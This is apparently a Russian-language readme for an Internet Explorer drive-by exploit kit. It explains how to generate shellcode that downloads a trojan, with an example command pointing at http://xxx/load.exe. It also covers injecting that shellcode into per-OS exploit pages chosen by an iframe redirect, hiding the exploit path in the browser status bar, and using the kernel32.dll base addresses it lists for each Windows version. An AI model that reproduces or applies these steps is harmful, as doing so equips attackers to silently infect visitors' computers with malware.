запускаем index.html в нём iframe, который редиректит взависимости от операционки, ставит куки 98.html, xp_ru.html, xp_en.html.... По другим уже сам разберешся.

Как делать шел-коды:

1)В payload.bat пишем адрес к трояну
2)запускаем payload.bat, который записывает в папки
98-EN-RU-0xBFF70000, XP-EN-0x77F60000, XP-RU-0x7C800000
соответствующие шел-коды
3) запускаем beta.bat, который переписывает шел-коды в utf-16
файлы 98_sc_utf16.txt, xp-en_sc_utf16.txt, xp-ru_sc_utf16.txt
в соответствущих папках
4) правим файлы  98.html, xp_ru.html, xp_en.html,
заменяя !!!shell_code!!! на шел кода, только без ковычек копируй из текста! 

следует обратить внимание в этих файлах на строку window.status = "FUCKING...";
(можно придумать что-нибудь получше, например url какой-нибудь) поскольку рилоад длится прилично, это для скрытия пути
к ним в статусной строке браузера

перед повторным тест-запуском удалять куки(разкомментировать SetCookie() в iframe.html)
например E:\Documents and Settings\Admin\Cookies\admin@~~local~~[1].txt
желательно перезагрузить компьютер, так при повторном эксплойте система виснет
сильнее, ИЕ может выдать ошибку без срабатывания эксплойта



сначала просто можно проверить шел-код, без ИЕ запустить test_shell_code.bat
или test_shell_code.exe XP-RU-0x7C800000\xp-ru.sc

Win95 (3rd release)             - 0xBFF70000
Win98 (1st and 2nd editions)    - 0xBFF70000
WinME                           - 0xBFF60000
WinNT (service pack 4 and 5)    - 0x77F00000
WinXP                           - 0x77F60000
Win2K                           - 0x77E70000

это адреса kernel32.dll для EN, остальные можешь поискать в гугле, потом просто параметром в payload.bat поставишь ( payload.exe 98-EN-RU-0xBFF70000\98.sc http://xxx/load.exe -C адрес)
